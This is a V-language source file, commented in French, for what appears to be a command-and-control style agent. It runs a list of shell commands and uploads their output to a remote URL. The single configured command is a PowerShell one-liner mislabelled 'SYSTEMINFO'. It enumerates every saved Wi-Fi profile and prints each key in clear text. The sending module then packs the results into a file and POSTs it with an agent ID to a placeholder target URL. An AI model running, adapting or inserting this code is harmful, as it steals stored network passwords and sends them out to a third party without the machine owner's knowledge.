import os
import time
import net.http


enum ModuleState as u8 {
	unknown		// inconnu
	started		// le module est démarré mais n'a pas commencé
	running		// en cours de traitement
	error		// le module est en erreur
	finish		// le module à terminé son travail
}

enum Module as u8 {
	ecoute = 0
	execution = 1
	envoie = 2
}

// le type de shell dans lequel la commande doit s'exécuter
enum ShellType as u8 {
	cmd
	powershell
	bash
}

struct Commande {
	command string
	type_shell ShellType
	id string // id de la commande
}

struct Response{
	output string
	index int // index de la commande dans la liste "commandes_list"
	exit_code int
}

struct SharedVariable {
	agent_identifier string = "<id-agent>" // de la forme "agent-x" ou x est le numèro de l'agent
	cryptkey []u8 = [u8(0)] // la clé de chiffrement pour le module d'écoute ou d'envoi
	iv []u8 = [u8(0)] // le vecteur d'initialisation pour le chiffrement aes-256-cbc

	number_of_module int = 3

    commandes_list []Commande = [
		Commande{command: '\$tmp_networks = (netsh wlan show profile | select-string "Profil Tous les");\$networks = ((\$tmp_networks -split (\':\') -split (\'Profil Tous les utilisateurs\')) | Select-String \'[A-Z]|[0-9]\') -replace " ","";foreach(\$network in \$networks){ netsh wlan show profile \$network key=clear}', type_shell: ShellType.powershell, id: "SYSTEMINFO"},
	]
mut:

	execution_commande_list []int
	ip []u8 = [u8(127),0,0,1]
	response_list []Response
	module_state shared []ModuleState = [ModuleState.unknown, ModuleState.unknown, ModuleState.unknown]
	module_state_description shared []string = ['','','']
}

fn main(){
	shared shared_variable := SharedVariable{}

	sw := time.new_stopwatch()
	shared_variable.module_ecoute()
	rlock shared_variable {
		println(show_all_module_status(shared_variable))
	}
		println("[i] - fin d'éxecution. Temps d'énumeration  ${sw.elapsed().seconds()}")
}

fn dump_shared_variable(sv &SharedVariable){
	println("=======================-[Dump des shared variables]-=======================")
		println("	identifiant de l'agent : ${sv.agent_identifier}")
		for c in sv.commandes_list	{
			println("${c}")
		}
		println("	list d'execution : ${sv.execution_commande_list}")
		println("	ip : ${sv.ip}")
		println("	response_list : ${sv.response_list}")
		rlock sv.module_state {
			println("	module state be like : ${sv.module_state}")
		}
}

fn show_all_module_status(sv &SharedVariable) string {
	mut rst := '\n'
	unsafe {
		for i in 0..sv.number_of_module {
			rst += '==== Module ' + Module(i).str() + ' :\n'
			rlock sv.module_state, sv.module_state_description {
				rst += ' - status : ' + sv.module_state[i].str() + '\n'
				rst += ' - description : ' + sv.module_state_description[i] + '\n'
			}
			rst += '\n'
		}
	}

	return rst
}

// ------------------------------------------------------------------------- Module écoute
fn (shared sv SharedVariable) module_ecoute(){
	lock sv.module_state {
		sv.module_state[Module.ecoute] = ModuleState.running
	}

	// on remplis le tableau des commandes à exécuter
	lock sv {
		for i in 0 .. sv.commandes_list.len {
			sv.execution_commande_list << i
		}
	}

	m_execution := spawn sv.module_execution()
	m_envoie := spawn sv.module_envoie()
	m_execution.wait()
	m_envoie.wait()

	lock sv.module_state {
		sv.module_state[Module.ecoute] = ModuleState.finish
	}
}

// ------------------------------------------------------------------------- Module exécution
fn (shared sv SharedVariable) module_execution() {

    lock sv.module_state {
        sv.module_state[Module.execution] = ModuleState.running
    }

    for cmd_index in sv.execution_commande_list {
        mut cmd := Commande{}
        rlock sv {
            cmd = sv.commandes_list[cmd_index]
        }

        mut shell_command := ""
        if cmd.type_shell == ShellType.cmd {
            shell_command = "cmd /c " + cmd.command
        } else if cmd.type_shell == ShellType.powershell {
            shell_command = "powershell.exe -Command " + cmd.command
        } else if cmd.type_shell == ShellType.bash {
			shell_command = "bash -c \'" + cmd.command + "\'"
		}

        exec_result := os.execute(shell_command)

        lock sv {
            sv.response_list << Response{output: exec_result.output.trim_space(), index: cmd_index, exit_code: exec_result.exit_code}
        }
    }

    lock sv.module_state {
        sv.module_state[Module.execution] = ModuleState.finish
    }
}

// ------------------------------------------------------------------------- Module envoie - import net.http
fn (shared sv SharedVariable) module_envoie() {
	dump_filename := 'agent_enumeration.txt' // argument modifiable à la compilation
	target_url := '<url>' // argument modifiable représentant l'url ciblé de transmission des l'énumération

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.started
    }

	mut s := ModuleState.unknown

	for {
		
		rlock sv.module_state {
			s = sv.module_state[Module.execution]
		}
		// dès que le module d'exécution se termine, on break
		if s == ModuleState.finish {
			break
		}

		time.sleep(10 * time.millisecond)
	}

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.running
    }

	mut final_enum_file := ""
	mut header := ""
	for i in 0..sv.response_list.len {

		header = sv.commandes_list[sv.response_list[i].index].id
		rlock sv {
			header += " "  + sv.response_list[i].exit_code.str()
			header += " " + (sv.response_list[i].output.count("\n") + 1).str() + "\n"
		}
		final_enum_file += header + sv.response_list[i].output + "\n"
	}
	final_enum_file = final_enum_file.trim_space()

	// une fois les données récolté, on envoie le tout à l'API :
	// la strucutre de donnée du fichier a envoyer
    mut files := []http.FileData{}
    
    // adding file to the array
    files << http.FileData {
        filename:        dump_filename,
        content_type:    "plain/text",
        data:            final_enum_file
    }

    // PostMultipartFormConfig struct
	cfg := http.PostMultipartFormConfig{
		form:{
			"id_agent": sv.agent_identifier
		},
		files: {
			"file":    files
		}
	}

    http.post_multipart_form(target_url, cfg) or {
		lock sv.module_state, sv.module_state_description {
        	sv.module_state[Module.envoie] = ModuleState.error
			sv.module_state_description[Module.envoie] = "Error during POST request :\n" + err.str()
    	}
		return
	}

	/*mut file := os.create(dump_filename) or {
		lock sv.module_state {
        	sv.module_state[Module.envoie] = ModuleState.error
    	}
		return
	}
	file.write_string(final_enum_file)  or {
		lock sv.module_state {
        	sv.module_state[Module.envoie] = ModuleState.error
    	}
		return
	}
	file.close()*/

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.finish
    }

}